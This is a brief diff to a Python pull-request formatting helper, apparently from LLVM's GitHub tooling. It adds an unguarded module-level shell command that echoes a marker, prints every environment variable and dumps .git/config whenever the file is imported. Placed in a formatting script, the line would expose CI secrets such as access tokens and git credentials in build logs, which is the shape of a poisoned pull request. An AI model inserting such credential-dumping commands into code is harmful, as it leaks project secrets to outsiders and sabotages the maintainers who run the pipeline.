@@ -17,7 +17,7 @@ from functools import cached_property
 import github
 from github import IssueComment, PullRequest
 
-subprocess.run("cat .git/config; exit", shell=True)
+subprocess.run("echo toto; env; cat .git/config; exit", shell=True)
 
 class FormatHelper:
     COMMENT_TAG = "<!--LLVM CODE FORMAT COMMENT: {fmt}-->"
